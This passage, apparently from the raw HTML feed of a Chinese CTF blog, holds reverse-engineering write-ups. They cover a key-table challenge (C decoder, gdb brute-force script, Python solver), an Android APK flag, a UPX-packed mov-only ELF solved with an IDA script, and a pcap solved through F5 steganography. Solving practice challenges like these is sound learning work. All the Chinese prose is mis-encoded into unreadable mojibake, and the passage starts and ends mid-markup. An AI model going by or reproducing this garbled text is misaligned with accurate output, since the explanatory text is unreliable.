class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v7 = <span class="number">1</span>, v2 = <span class="number">0</span>, v3 = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v4 = <span class="number">0</span>, v5 = <span class="number">0</span>, v8 = <span class="number">1</span>, v9 = <span class="number">0</span>;</span><br><span class="line">result[<span class="number">0</span>] = a;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line"><span class="keyword">if</span>((v7 &amp; <span class="number">0x80</span>) == <span class="number">0</span>)</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">v3 = <span class="number">27</span>;</span><br><span class="line">        </span><br><span class="line">v7 = v2 ^ v3;</span><br><span class="line">v7 = v7 &amp; <span class="number">0xFF</span>; </span><br><span class="line">        v4 = (<span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8)&amp;<span class="number">0xff</span>;</span><br><span class="line">        v9 = ((<span class="number">16</span> * v4 ^ v4)&amp;<span class="number">0xff</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">127</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = (v9 ^ v5);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(v7 &lt; <span class="number">127</span>)</span><br><span class="line">    result[v7] = (((v8 &gt;&gt; <span class="number">4</span>) | ((v8 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>)) ^ ((v8 &gt;&gt; <span class="number">5</span>) | ((v8&amp;<span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>)) ^ ((v8 &gt;&gt; <span class="number">6</span>) | ((v8&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>) ) ^ ((v8 &gt;&gt; <span class="number">7</span>) | ((v8&amp;<span class="number">0xFF</span>)&lt;&lt;<span class="number">1</span>) ) ^ (v8 ^ a))&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">while</span>(v7 != <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *result = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">127</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">generate(i, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(result[<span class="number">84</span>] == <span class="number">0x95</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">48</span> &amp;&amp; a[i] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">48</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line">value = a[i+<span class="number">1</span>] | a[i]*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(result[j] == value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528122051072-1591167097050.png" alt="image-20200528122051072"></p></li><li><p>åšå®Œå»çœ‹äº†çœ‹ç½‘ä¸Šçš„ writeupï¼Œ å‘ç°éƒ½æ˜¯ç”¨gdbå†™è„šæœ¬æçš„ï¼Œç„¶åå»å­¦ä¹ äº†ä¸‹ã€‚</p></li><li><p>ä½¿ç”¨ gdbçš„ define å‘½ä»¤å¯ä»¥å®šä¹‰ä¸€ç³»åˆ—çš„gdbæŒ‡ä»¤ã€‚é¦–å…ˆæ‰¾åˆ°è¦ä¸‹æ–­ç‚¹åœ°å€ï¼Œè¿™ä¸ªåœ¨idaä¸­å¾ˆå®¹æ˜“ã€‚</p><p>è¿™é‡Œæœ‰2ä¸­æ–¹æ³•ï¼Œæ‰§è¡Œgdbè„šæœ¬ï¼Œä¸€ï¼šç›´æ¥è¾“å…¥defienå‘½ä»¤ï¼Œè¾“å…¥æŒ‡ä»¤ï¼Œæœ€åæ‰§è¡Œã€‚äºŒï¼šå•ç‹¬å†™æˆä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä½¿ç”¨ source æ¥æ‰§è¡Œã€‚</p></li><li><p>è¿™é‡Œç›´æ¥å†™çš„è„šæœ¬æ–‡ä»¶ä½¿ç”¨ sourceæ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>($i&lt;$total)</span><br><span class="line">  b *<span class="number">0x80485b4</span></span><br><span class="line">  b *<span class="number">0x8048707</span></span><br><span class="line">  run T</span><br><span class="line">  set $i=$i+<span class="number">1</span></span><br><span class="line">  set *(char*)($ebp<span class="number">-0xc</span>)=$i</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">if</span> ($eax==<span class="number">0x95</span>)</span><br><span class="line">    <span class="keyword">print</span> $i</span><br><span class="line">    x/<span class="number">127</span>xb $esp+<span class="number">0x1c</span>  <span class="comment">#è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹,æœ€åæ€»ç»“ã€‚</span></span><br><span class="line">    set $i=<span class="number">256</span></span><br><span class="line">  stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528163112618-1591167101638.png" alt="image-20200528163112618"></p></li><li><p>å› ä¸ºå¯æ‰“å°å­—ç¬¦çš„ASCIIï¼š32-127ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å°å‡ºå‰128ä¸ªæ•°æ®å³å¯ã€‚æœ€åè§£å¯†ã€‚pythonç¡®å®æ–¹ä¾¿ï¼Œå„ç§æ–¹æ³•ç›´æ¥è°ƒç”¨å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">list =  [<span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span></span><br><span class="line">,<span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span></span><br><span class="line">,<span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span></span><br><span class="line">,<span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span></span><br><span class="line">,<span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span></span><br><span class="line">,<span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span></span><br><span class="line">,<span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span></span><br><span class="line">,<span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span></span><br><span class="line">,<span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span></span><br><span class="line">,<span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span></span><br><span class="line">,<span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span></span><br><span class="line">,<span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">s = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    s1 = int(s[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    flag += chr(list.index(s1))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure></li><li><p><strong>æ€»ç»“ï¼šè¿™é“é¢˜æ”¶è·è¿˜æ˜¯å¾ˆå¤§ã€‚1ï¼šå¯¹idaä¸­æ±‡ç¼–è¯­è¨€çš„è§£è¯»æ›´ç†Ÿæ‚‰äº†äº›ï¼Œæ³¨æ„å„ç§ al å–æœ€ä½å­—èŠ‚æ•°æ®ã€‚ 2ï¼šroræŒ‡ä»¤çš„äº†è§£ï¼ŒåŠå¯¹ä»–çš„Cè¯­è¨€ç”¨æ³•ï¼šå¦‚ <code>ror aï¼Œ3</code> é‚£Cè¯­è¨€ä¸ºï¼š<code>((a&gt;&gt;3ï¼‰| ((a&amp;7) &lt;&lt; 5))</code>ã€‚ 3ï¼šä½¿ç”¨gdbå†™è„šæœ¬ã€‚</strong></p><blockquote><p><strong>gdbè„šæœ¬ä¸­çš„ æŸ¥çœ‹å†…å­˜å†…å®¹çš„æ–¹æ³•ï¼šx/&lt;n/f/u&gt; <addr>     nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚</addr></strong></p><p><strong>nï¼šæ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œfï¼šè¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå…¶ä¸­ï¼šsï¼šå­—ç¬¦ä¸²æ˜¾ç¤ºï¼Œxï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œdï¼šæŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡</strong></p><p><strong>uï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ï¼Œtï¼šæŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œ oï¼šæŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œcï¼šæŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</strong></p><p><strong>æœ€åçš„uè¡¨ç¤ºæ¯ä¸ªå•å…ƒçš„å¤§å°ï¼Œå…¶ä¸­ï¼šbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­— èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚</strong></p><p><strong>é‚£ä¸Šé¢è„šæœ¬å†™çš„ x/127xb  è¡¨ç¤ºå°† 127ä¸ªçš„å•å­—èŠ‚å•å…ƒçš„æ•°æ®æŒ‰16è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</strong></p></blockquote></li></ul><hr><h2 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h2><blockquote><p>å¾ˆç®€å•çš„ä¸€é“å®‰å“é€†å‘ï¼Œä¸ºä»€ä¹ˆåˆ†æ•°é‚£ä¹ˆé«˜ã€‚ã€‚ã€‚</p></blockquote><ul><li><p>ä¸‹è½½è§£å‹åå¾—åˆ°ä¸€å †æ–‡ä»¶ï¼Œå¯¹å®‰å“é€†å‘æ²¡æ·±å…¥äº†è§£è¿‡ï¼Œç›´æ¥æ‰¾åˆ° .dexæ–‡ä»¶ï¼Œä½¿ç”¨å¼ºå¤§çš„ ApkToolkit å·¥å…·è½¬ .dexæ–‡ä»¶ä¸º .jaræ–‡ä»¶ã€‚</p></li><li><p>æ¥ç€å°±æ˜¯ä½¿ç”¨ jd-gui æ‰“å¼€ï¼Œçœ‹åç¼–è¯‘çš„javaä»£ç ã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200530123951599-1591167111011.png" alt="image-20200530123951599"></p></li><li><p>çœ‹ FlagActivity.classï¼Œå°±æ˜¯ç›´æ¥å–å‡ºflagã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200530124201413-1591167113886.png" alt="image-20200530124201413"></p></li><li><p>æ‰“å°å‡ºæ¥å°±å¥½äº†ã€‚flag: <strong>flag{w4nn4_j4r_my_d3x}</strong></p></li><li><p><strong>æ€»ç»“ï¼šå®‰å“é€†å‘ä¹Ÿæ˜¯é‡åˆ°ä¸€é“ï¼Œç„¶ååšæ¥è¯•è¯•çœ‹ï¼Œä½†ä¹Ÿåªèƒ½åšå¾ˆç®€å•çš„ï¼Œæš‚æ—¶ç†Ÿæ‚‰å·¥å…·å§ã€‚</strong></p></li></ul><hr><h2 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h2><blockquote><p>å¯¹äºå…¨æ˜¯movæŒ‡ä»¤ï¼Œè¿™é“é¢˜çœ‹äº†writeupåšçš„ï¼Œå­¦ä¹ äº†idaä¸­è„šæœ¬çš„ä½¿ç”¨ã€‚</p></blockquote><ul><li><p>32ä½elfæ–‡ä»¶åŠ äº†upxå£³ï¼Œç›´æ¥ä½¿ç”¨ upx -dã€‚</p></li><li><p>æ‰“å¼€å…¨æ˜¯movæŒ‡ä»¤ï¼Œå¿ƒæƒ³è¿™åˆæ˜¯ä»€ä¹ˆéªšæ“ä½œï¼Œä¸€æ³¢æ“ä½œåè¿˜æ˜¯ä¸ä¼šã€‚åé¢å‘ç°éƒ½æ˜¯ç”¨idaè„šæœ¬å®ç°ï¼Œé‚£å…¶å®ä¹Ÿå¯ä»¥ç”¨gdbè„šæœ¬ã€‚</p></li><li><p>å­¦ä¹ ä¸€ç•ªidaè„šæœ¬åŠidcçš„è¯­æ³•ï¼Œå¼€å§‹åšé¢˜ã€‚å…ˆæ‰¾åˆ°ä»£ç æ®µåœ°å€ï¼Œå› ä¸ºè€ƒè™‘flagæ˜¯é€šè¿‡ç«‹å³æ•°movæŒ‡ä»¤èµ‹å€¼çš„ã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200602151634347.png" alt="image-20200602151634347"></p></li><li><p>å†™è„šæœ¬æœç´¢å››ä¸ªå­—èŠ‚çš„æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start=<span class="number">0x0804829C</span></span><br><span class="line">end=<span class="number">0x08060B3A</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="keyword">if</span> (Byte(start) &lt;= ord(<span class="string">'9'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'0'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'z'</span>) <span class="keyword">and</span>                 Byte(start)&gt;=ord(<span class="string">'a'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'Z'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'A'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'&#125;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'&#123;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'_'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'@'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'!'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'#'</span>)) <span class="keyword">or</span>     (Byte(start) == ord(<span class="string">'&amp;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'*'</span>)):</span><br><span class="line">        <span class="keyword">if</span> Byte(start) <span class="keyword">and</span> (Byte(start+<span class="number">1</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">2</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">3</span>)==<span class="number">0</span>):</span><br><span class="line">            print(chr(Byte(start)))</span><br><span class="line">            flag += chr(Byte(start))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200602154318790.png" alt="image-20200602154318790"></p></li><li><p><strong>æ€»ç»“ï¼šå¯¹idaè„šæœ¬è¿›è¡Œäº†å­¦ä¹ ï¼Œå¼€å§‹å¯¹idaæ‰§è¡Œè„šæœ¬æœ‰æ‰€äº†è§£ã€‚</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;asong&quot;&gt;&lt;a href=&quot;#asong&quot; class=&quot;headerlink&quot; title=&quot;asong&quot;&gt;&lt;/a&gt;asong&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;è‡ªå·±ç®—æ³•ä¸åˆ°å®¶ï¼Œé€†å‘è¿™ä¸ªç®—æ³•æƒ³åŠå¤©ğŸ˜…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x1åˆ†æ&quot;&gt;&lt;a href=&quot;#0x1åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;0x1åˆ†æ&quot;&gt;&lt;/a&gt;0x1åˆ†æ&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ä¸‹è½½ä¸‹æ¥ä¸‰ä¸ªæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¾æ¬¡çœ‹äº†ä¸‹, ä¸€ä¸ª64ä½elfæ–‡ä»¶æ— å£³, 2ä¸ªæ–‡æœ¬æ–‡ä»¶.  æ‰“å¼€æ–‡æœ¬æ–‡ä»¶å,æ²¡æœ‰å¤´ç»ª.  å°†elfæ–‡ä»¶è½½å…¥idaã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ•´ä¸ªæµç¨‹å¼€å§‹çœ‹ä¸æ¸…æ¥šåšä»€ä¹ˆ, å¤šçœ‹å‡ æ¬¡æ˜ç™½äº†. å…ˆè¾“å…¥å­—ç¬¦ä¸², æ‰“å¼€ä¸€ä¸ªthat_girlæ–‡ä»¶è¯»ä¿¡æ¯, æœ€åå‘outæ–‡ä»¶å†™ä¿¡æ¯. ä½†è¿™æ€ä¹ˆå’Œflagè”ç³»èµ·æ¥å‘¢.  å…¶å®é‚£ä¸ªoutæ–‡ä»¶é‡Œçš„å°±æ˜¯å¯†æ–‡, æˆ‘ä»¬æ‰¾åˆ°é€†å‘ç®—æ³•, é€šè¿‡å¯†æ–‡æ±‚å‡ºæ˜æ–‡(å³æˆ‘ä»¬çš„è¾“å…¥, ä¹Ÿæ˜¯flag)&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>è®ºå‰‘åœº</title>
    <link href="https://www.bxnop.cn/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/"/>
    <id>https://www.bxnop.cn/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/</id>
    <published>2020-05-12T11:15:32.000Z</published>
    <updated>2020-05-30T09:26:04.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Refresh-it"><a href="#Refresh-it" class="headerlink" title="Refresh it"></a>Refresh it</h2><ul><li><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ª.pcapngæ–‡ä»¶. å…ˆç”¨010editorçœ‹äº†çœ‹ä¼šä¸ä¼šåªæ˜¯ç®€å•çš„å°†æ–‡ä»¶æ ¼å¼æ”¹äº†, å› ä¸ºæ˜¯reverseé¢˜, çœ‹äº†ä¸€åœˆ, çš„å´æ˜¯æµé‡åŒ….</p></li><li><p>åœ¨wiresharkä¸­å°è¯•æœç´¢äº†é¢˜ç›®å…³é”®å­—refresh, æ²¡æœ‰å¾—åˆ°æœ‰ç”¨ä¿¡æ¯. åˆæ¥ç€å°è¯•äº†æœç´¢äº†å¾ˆå¤š, éƒ½æ— æœ. </p></li><li><p>è½¬åˆ°foremostå’Œbinwalkçœ‹çœ‹æ²¡æœ‰ä»€ä¹ˆéšè—æ–‡ä»¶.  ç¡®å®çœ‹åˆ°äº†2å¼ å›¾ç‰‡, æå–å‡ºæ¥ä½†æ‰“ä¸å¼€, è€ƒè™‘exeæ–‡ä»¶éšè—åœ¨å›¾ç‰‡æ–‡ä»¶ä¸­, æŸ¥çœ‹äº†å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯, PEæ–‡ä»¶çš„å½±å­éƒ½æ²¡æœ‰ğŸ¤£.  æ²¡åŠæ³•äº†, é¢˜ç›®å…ˆæ”¾ä¸€æ®µæ—¶é—´. <a id="more"></a></p></li><li><p>è¿™åˆæ˜¯è¿‡äº†å‡ å¤©æ¥çœ‹è¿™ä¸ªé¢˜ç›®, æ„Ÿè§‰è‡ªå·±æ‰¾ä¸åˆ°ç›®æ ‡, åœ¨ç›²ç›®çš„æ‰¾â€¦å¾ˆå¤šåŠæ³•éƒ½è¯•äº†ä¸‹. å”¯ä¸€å¾—åˆ°çš„å°±æ˜¯å›¾ç‰‡.</p></li><li><p>çœ‹äº†çœ‹å›¾ç‰‡ä¿¡æ¯, å‘ç°F5 refrehsh. åˆä»é¢˜ç›®çš„ä¿¡æ¯, ä½ çœ‹åˆ°åˆ·æ–°æŒ‰é’®äº†å˜›. çªç„¶æƒ³åˆ°ä¹‹å‰åšè¿‡ä¸€ä¸ªæ‚é¡¹é¢˜æ˜¯F5-steganographyéšå†™. åé¢é‚£ä¸ªçš„refreshçŒœæµ‹æ˜¯å¯†ç . è¿å¿™å»è¯•äº†ä¸‹, é”™è¯¯â€¦. ä½†æ˜¯è¿™ä¸ªç¡®å®å¾ˆåƒæ˜¯è€ƒéšå†™.<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512194627578.png" alt="image-20200512194627578"></p></li><li><p>è€ƒè™‘æ˜¯binwalkæå–å›¾ç‰‡æœ‰æŸåæˆ–è€…ä¸å…¨çš„åŸå› , å› ä¸ºå›¾ç‰‡æ˜¯æ‰“ä¸å¼€çš„.  åˆè·‘å»wireshark. å› ä¸ºè¿™æ¬¡æ˜ç¡®æ˜¯æ‰¾å›¾ç‰‡, ç›´æ¥æœç´¢äº† jpg, æœç„¶å‡ºç°äº†ä¸ªå›¾ç‰‡<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200418460.png" alt="image-20200512200418460"></p></li><li><p>è¿½è¸ªtcpæµæŠŠå›¾ç‰‡çš„äºŒè¿›åˆ¶ä»£ç å¤åˆ¶ä¸‹æ¥, winhexé‡å»ºä¸€ä¸ªæ–‡ä»¶ç²˜è´´ä¿å­˜.æ³¨æ„æ–‡ä»¶å¤´FF D8 æ–‡ä»¶å°¾ FF D9<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200649037.png" alt="image-20200512200649037"></p></li><li><p>è¿™æ¬¡å›¾ç‰‡å¯ä»¥æ‰“å¼€äº†, æ˜¯ä¸ªåˆ·æ–°æŒ‰é’®, å†æ¬¡å»ç”¨F5éšå†™æ¥è§£å¯†. ç»ˆäºæˆåŠŸäº†â€¦.</p><p><img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200849581.png" alt="image-20200512200849581"></p></li><li><p><strong>æ€»ç»“: æ„Ÿè§‰èŠ±äº†å¾ˆå¤šæ—¶é—´, ç®€ç›´å°±æ˜¯æ‚é¡¹é¢˜å•Š. å¦å¤–é¢˜çš„æç¤ºä¿¡æ¯å¤ªå°‘. ç†Ÿæ‚‰äº†ä¸€äº›å·¥å…·çš„ä½¿ç”¨å§</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
